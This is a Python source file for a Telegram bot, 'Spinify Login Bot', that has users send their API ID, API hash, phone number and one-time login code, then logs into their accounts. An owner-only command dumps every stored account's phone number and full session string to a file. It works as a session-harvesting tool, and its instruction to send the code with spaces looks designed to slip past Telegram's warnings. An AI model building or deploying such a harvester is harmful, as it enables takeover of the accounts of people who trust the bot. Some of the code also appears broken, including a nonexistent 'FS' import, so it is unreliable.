import os
import re
import json
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher
from aiogram.types import Message, FS
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import StatesGroup, State
from db import enqueue_login, get_all_accounts
from datetime import datetime
from aiogram.types import InputFile

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = os.getenv("OWNER_ID")
OWNER_USERNAME = os.getenv("OWNER_USERNAME")

if OWNER_ID:
    try:
        OWNER_ID = int(OWNER_ID)
    except:
        OWNER_ID = None

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class LoginStates(StatesGroup):
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_phone = State()
    waiting_otp = State()

@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.reply(
        "👋 Welcome to Spinify Login Bot!\n\n"
        "Use /login to add a Telegram account (you'll be asked for API ID, API HASH, phone and OTP).\n"
        "Only the owner can use /get_sessions."
    )

@dp.message(Command("login"))
async def login_cmd(message: Message, state: FSMContext):
    await state.clear()
    await state.set_state(LoginStates.waiting_api_id)
    await message.reply("Please send your API ID (numeric).")

@dp.message(LoginStates.waiting_api_id)
async def api_id_handler(message: Message, state: FSMContext):
    text = message.text.strip()
    if not text.isdigit():
        await message.reply("API ID must be numeric. Send the numeric API ID.")
        return
    await state.update_data(api_id=text)
    await state.set_state(LoginStates.waiting_api_hash)
    await message.reply("Now send your API HASH.")

@dp.message(LoginStates.waiting_api_hash)
async def api_hash_handler(message: Message, state: FSMContext):
    api_hash = message.text.strip()
    await state.update_data(api_hash=api_hash)
    await state.set_state(LoginStates.waiting_phone)
    await message.reply("Now send the phone number (with country code), e.g. +1234567890")

@dp.message(LoginStates.waiting_phone)
async def phone_handler(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not re.match(r'^\+?[0-9]{7,15}$', phone):
        await message.reply("Phone number seems invalid. Send like +1234567890")
        return
    await state.update_data(phone=phone)
    await state.set_state(LoginStates.waiting_otp)
    await message.reply(
        "OTP will be requested shortly. When you receive the code, send it here **with spaces** like:\n\n"
        "`4 4 5 3 6`\n\nI will combine spaces into the code `44536` automatically."
    )

@dp.message(LoginStates.waiting_otp)
async def otp_handler(message: Message, state: FSMContext):
    otp_raw = message.text.strip()
    digits = re.findall(r'\d', otp_raw)
    if not digits:
        await message.reply("No digits found in OTP. Please send digits (they may be space-separated).")
        return
    otp = "".join(digits)
    data = await state.get_data()
    api_id = int(data["api_id"])
    api_hash = data["api_hash"]
    phone = data["phone"]
    chat_id = message.from_user.id

    enqueue_login({
        "chat_id": chat_id,
        "api_id": api_id,
        "api_hash": api_hash,
        "phone": phone,
        "otp": otp
    })

    await state.clear()
    await message.reply(
        "✅ Login request queued. The worker will process it shortly. "
        "You will be notified in this chat on success/failure."
    )

def _is_owner(message: Message):
    if OWNER_ID and message.from_user.id == OWNER_ID:
        return True
    if OWNER_USERNAME and (message.from_user.username or "").lower() == OWNER_USERNAME.lower():
        return True
    return False

@dp.message(Command("get_sessions"))
async def get_sessions_cmd(message: Message):
    if not _is_owner(message):
        await message.reply("❌ You are not authorized to use this command.")
        return

    accounts = get_all_accounts()
    if not accounts:
        await message.reply("No saved sessions found.")
        return

    lines = []
    for acc in accounts:
        lines.append("---- ACCOUNT ----")
        lines.append(f"user_id: {acc.get('user_id')}")
        lines.append(f"phone: {acc.get('phone')}")
        lines.append(f"account_name: {acc.get('account_name')}")
        lines.append(f"username: {acc.get('username')}")
        lines.append(f"session_name: {acc.get('session_name')}")
        lines.append(f"session_string: {acc.get('session_string')}")
        lines.append("")

    text = "\n".join(lines)

    fname = f"sessions_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(text)

    await message.answer_document(document=InputFile(fname), caption="All sessions (owner only).")
    os.remove(fname)

if __name__ == "__main__":
    import asyncio
    dp.run_polling(bot)
